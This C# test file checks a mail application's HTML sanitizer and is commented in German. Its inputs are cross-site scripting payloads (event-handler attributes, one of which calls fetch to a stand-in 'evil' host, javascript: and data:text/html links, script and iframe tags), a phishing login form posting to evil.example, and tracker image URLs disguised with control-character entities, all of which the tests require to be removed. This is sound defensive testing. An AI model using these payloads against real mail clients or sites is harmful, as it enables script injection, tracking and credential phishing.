using DmOffice.Mail;

namespace DmOffice.Tests;

/// <summary>Angriffe ueber den HTML-Inhalt einer Mail (Ereignis-Attribute, formaction, javascript:-Links).</summary>
public class MailHtmlAttackTests
{
    private static string Clean(string html) => MailHtml.Sanitize(html, allowRemote: true, cid => null).Html;

    [Theory]
    [InlineData("<a href=\"https://x.de\" onpointerup=\"fetch('//evil')\">Klick</a>", "onpointerup")]
    [InlineData("<p onmouseover=\"alert(1)\">x</p>", "onmouseover")]
    [InlineData("<img src=\"x.png\" onerror=\"alert(1)\">", "onerror")]
    [InlineData("<form action=\"https://evil\"><input type=\"submit\" formaction=\"https://evil\" value=\"Weiter\"></form>", "formaction")]
    [InlineData("<a href=\"javascript:alert(1)\">x</a>", "javascript:")]
    [InlineData("<svg onload=\"alert(1)\"><circle r=\"1\"/></svg>", "onload")]
    [InlineData("<iframe src=\"https://evil\"></iframe>", "<iframe")]
    [InlineData("<script>alert(1)</script>", "<script")]
    [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>", "text/html")]
    public void Active_content_is_removed(string html, string forbidden)
    {
        var result = Clean(html);
        Assert.DoesNotContain(forbidden, result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Formulare_und_Eingabefelder_werden_entfernt()
    {
        // Phishing-Kulisse: Anmeldeformular mit Passwortfeld in einer fremden Mail
        var result = Clean("<p>Bitte bestätigen:</p><form method=\"post\" action=\"https://evil.example/x\">" +
            "<input name=\"user\"><input name=\"p\" type=\"password\"><select><option>A</option></select>" +
            "<textarea>vorbelegt</textarea><button>Anmelden</button></form>");
        foreach (var tag in new[] { "<form", "<input", "<select", "<option", "<textarea", "<button", "password", "evil.example", "vorbelegt" })
            Assert.DoesNotContain(tag, result, StringComparison.OrdinalIgnoreCase);
        // lesbarer Text bleibt
        Assert.Contains("Bitte bestätigen:", result);
        Assert.Contains("Anmelden", result);
    }

    [Theory]
    [InlineData("<img src=\"/&#9;/tracker.example/x.gif\">")]
    [InlineData("<img src=\"/&#10;/tracker.example/x.gif\">")]
    [InlineData("<img src=\"/&#13;/tracker.example/x.gif\">")]
    [InlineData("<img src=\"&#1;//tracker.example/x.gif\">")]
    public void Bildadressen_werden_wie_im_Browser_gelesen(string html)
    {
        var r = MailHtml.Sanitize(html, allowRemote: false, _ => null);
        Assert.True(r.HasRemoteImages);
        Assert.DoesNotContain("src=", r.Html.Replace("data-remote-src=", ""));
    }

    [Fact]
    public void Schema_mit_Tab_laedt_kein_Bild()
    {
        var r = MailHtml.Sanitize("<img src=\"ht&#9;tps://tracker.example/x.gif\">", allowRemote: false, _ => null);
        Assert.DoesNotContain("src=", r.Html.Replace("data-remote-src=", ""));
    }

    [Fact]
    public void Eigene_Bildadressen_bleiben()
    {
        var r = MailHtml.Sanitize("<img src=\"/api/mail/a/part?uid=1\"><img src=\"data:image/png;base64,iVBORw0KGgo=\">", allowRemote: false, _ => null);
        Assert.False(r.HasRemoteImages);
        Assert.Contains("src=\"/api/mail/a/part?uid=1\"", r.Html);
        Assert.Contains("src=\"data:image/png", r.Html);
    }
}
